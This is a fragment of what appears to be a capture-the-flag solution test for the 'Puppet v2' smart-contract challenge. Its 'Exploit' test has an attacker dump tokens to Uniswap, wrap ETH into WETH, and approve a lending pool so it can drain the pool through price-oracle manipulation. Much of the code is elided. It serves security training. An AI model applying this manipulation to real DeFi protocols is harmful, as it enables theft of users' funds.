...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * Approve and send all token to the uniswapRouter.
     * Thnaks that we get weth and we will significantly
    ...
    // We need more weth to take the all tokens
    await this.weth
      .connect(attacker)
      .deposit({ value: ethers.utils.parseEther("19.9") });

    /**
     * Calculate how many weth do we need and then borrow all
     * tokens from pool
     */
    ...
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, wethRequired);
